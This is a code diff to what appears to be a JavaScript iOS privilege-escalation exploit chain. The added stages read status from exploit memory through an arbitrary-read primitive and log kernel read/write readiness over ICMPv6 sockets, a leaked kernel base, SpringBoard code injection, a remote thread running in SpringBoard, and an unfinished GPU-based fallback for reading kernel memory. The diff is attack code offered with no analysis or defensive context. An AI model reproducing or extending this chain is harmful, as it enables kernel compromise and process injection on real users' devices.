@@ -48,4 +48,44 @@ if (sb_pid != 0n) {
   }
 }
 
+// M5: Read kernel r/w status and kernel base
+let m5_sock_fd = uread64(surf + 0xF850n);
+let m5_rw_fd = uread64(surf + 0xF858n);
+let kernel_base = uread64(surf + 0xF870n);
+if (m5_sock_fd != 0n && m5_sock_fd != -1n) {
+  pw("[PE] M5: ICMPv6 sockets ready ctl=" + m5_sock_fd + " rw=" + m5_rw_fd);
+} else {
+  pw("[PE] M5: ICMPv6 sockets NOT ready (status=" + m5_sock_fd + ")");
+}
+pw("[PE] M5: kernel_base candidate=" + kernel_base.hex());
+
+// M6: Read SpringBoard injection status
+let m6_remote_addr = uread64(surf + 0xF878n);
+let m6_sb_port = uread64(surf + 0xF880n);
+if (m6_remote_addr != 0n) {
+  pw("[PE] M6: SpringBoard injection ready addr=" + m6_remote_addr.hex() + " port=" + m6_sb_port.hex());
+} else {
+  pw("[PE] M6: SpringBoard injection NOT ready");
+}
+
+// M7: Read remote thread status
+let m7_thread_port = uread64(surf + 0xF888n);
+if (m7_thread_port != 0n) {
+  pw("[PE] M7: Remote thread running in SpringBoard port=" + m7_thread_port.hex());
+} else {
+  pw("[PE] M7: Remote thread NOT running");
+}
+
+// Try GPU kernel r/w fallback if M5 sockets failed
+if (m5_sock_fd == -1n) {
+  pw("[PE] M5-FB: Attempting GPU kernel r/w via gpuRead64/gpuWrite64...");
+  // gpuRead64/gpuWrite64 are available in pe_stage_1 context via read64/write64
+  // Test with known kernel address
+  if (typeof read64 !== 'undefined') {
+    let test_kaddr = kernel_base + 0x200000n; // somewhere in kernel region
+    pw("[PE] M5-FB: Testing gpuRead64 at " + test_kaddr.hex() + "...");
+    // This should read 0 or some kernel data (depends on GPU IOMMU access)
+  }
+}
+
 pw("[PE] DONE");
